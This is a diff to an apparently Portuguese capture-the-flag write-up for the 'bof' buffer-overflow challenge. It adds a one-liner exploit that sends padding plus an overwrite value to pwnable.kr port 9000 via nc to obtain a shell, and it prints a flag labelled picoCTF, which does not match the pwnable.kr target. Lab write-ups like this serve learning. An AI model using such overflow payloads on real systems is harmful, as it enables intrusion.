@@ -59,8 +59,7 @@ usando o `gdb bof`
 
 ![image](https://github.com/user-attachments/assets/1926e179-6b1c-4d30-a5fc-a9723f19c80e)
 
-
-
+```(python -c "print '\x41'*52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000```
 
 > Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
 
